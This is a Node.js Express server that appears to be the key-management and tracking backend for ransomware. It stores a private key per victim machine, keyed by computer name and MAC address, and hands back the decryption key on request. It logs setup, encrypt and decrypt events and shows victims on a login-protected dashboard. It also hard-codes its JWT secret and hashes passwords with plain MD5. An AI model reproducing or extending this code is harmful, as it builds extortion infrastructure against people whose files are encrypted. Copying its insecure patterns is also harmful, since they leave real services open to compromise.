// tested on wsl using node v10.16.3 & python 2.7.17

const express = require("express");
const bp = require("body-parser");
const jwt = require("jsonwebtoken");
const cookieParser = require("cookie-parser");
const app = express();
const { v1: uuidv1 } = require("uuid");
const fs = require("fs");
const crypto = require("crypto");
const util = require("util");
const exec = util.promisify(require("child_process").execFile);

const low = require("lowdb");
const FileSync = require("lowdb/adapters/FileSync");
const adapter = new FileSync("db.json");
const db = low(adapter);
db.defaults({ data: [], users: [], logs: [] }).write();

const ejs = require("ejs");

JWT_SECRET = "QAZXSASDWM213M12NAA@#@$@#1A";

app.use(bp.json());
app.use(bp.urlencoded({ extended: true }));
app.use(cookieParser());
app.use((req, res, next) => {
  res.append("Access-Control-Allow-Origin", ["*"]);
  res.append("Access-Control-Allow-Methods", "GET,PUT,POST,DELETE");
  res.append("Access-Control-Allow-Headers", "Content-Type");
  next();
});

const port = 3000;

app.post("/decrypt/:uid", async (req, res) => {
  const data = db.get("data").find({ uuid: req.params.uid }).value();
  if (data.macAddr !== req.body.macAddr) {
    res.status(556).send({ error: "Wrong MAC ADDRESS" });
    return;
  }

  try {
    const { stdout, stderr } = await exec("python", [
      "rsaEncrypt.py",
      "dec",
      `privkey/${req.params.uid}.der`,
      req.body.data,
    ]);
    res.json({ key: stdout.trim() });
  } catch (err) {
    res.status(555).send({ error: "Wrong key bro" });
  }
});

app.post("/save", (req, res) => {
  //Generate UUID
  const id = uuidv1();
  //Decode privkey from request body
  const decoded = Buffer.from(req.body.privkey, "base64");
  //Create directory if not exist
  if (!fs.existsSync("./privkey")) {
    fs.mkdirSync("./privkey");
  }
  //Write To Fle
  fs.writeFileSync(`privkey/${id}.der`, decoded);

  //Save to DB
  let result = db.get("data").find({
    compName: req.body.compName,
    macAddr: req.body.macAddr,
  });
  if (result.value()) {
    result = result.assign({ uuid: id }).write();
  } else {
    db.get("data")
      .push({
        compName: req.body.compName,
        macAddr: req.body.macAddr,
        uuid: id,
      })
      .write();
  }

  //Return result uuid
  res.json({ id });
});

app.post("/log", async (req, res) => {
  db.get("logs")
    .push({
      compName: req.body.compName,
      macAddr: req.body.macAddr,
      type: req.body.type,
      size: req.body.size,
      duration: req.body.duration || 0,
      created_at: new Date(),
    })
    .write();
  res.send("Success");
});

app.get("/dashboard", async (req, res) => {
  try {
    const authorization = req.cookies.Authorization;
    const token = authorization.split(" ")[1];
    const result = jwt.verify(token, JWT_SECRET);
  } catch (err) {
    res.redirect("login");
    return;
  }
  const dashboardTemplate = fs.readFileSync("view/dashboard.ejs", "utf-8");
  const data = db.get("data").value();
  const setupLog = db.get("logs").filter({ type: "setup" }).value();
  const encryptLog = db.get("logs").filter({ type: "encrypt" }).value();
  const decryptLog = db.get("logs").filter({ type: "decrypt" }).value();

  const html = ejs.render(dashboardTemplate, {
    data,
    encryptLog,
    setupLog,
    decryptLog,
  });
  res.send(html);
});

app.get("/login", async (req, res) => {
  const loginTemplate = fs.readFileSync("view/login.ejs", "utf-8");
  const html = ejs.render(loginTemplate);
  res.send(html);
});

app.post("/login", async (req, res) => {
  const result = db
    .get("users")
    .find({
      username: req.body.username,
      password: crypto
        .createHash("md5")
        .update(req.body.password)
        .digest("hex"),
    })
    .value();
  if (!result) {
    res.send("Invalid username / password");
    return;
  }
  const key = `Bearer ${jwt.sign(req.body.username, JWT_SECRET)}`;
  res.cookie("Authorization", key, {
    maxAge: 15 * 60 * 1000,
    httpOnly: true,
  });
  res.redirect("dashboard");
});

app.listen(port, () => {
  console.log(`listening on port ${port}`);
});
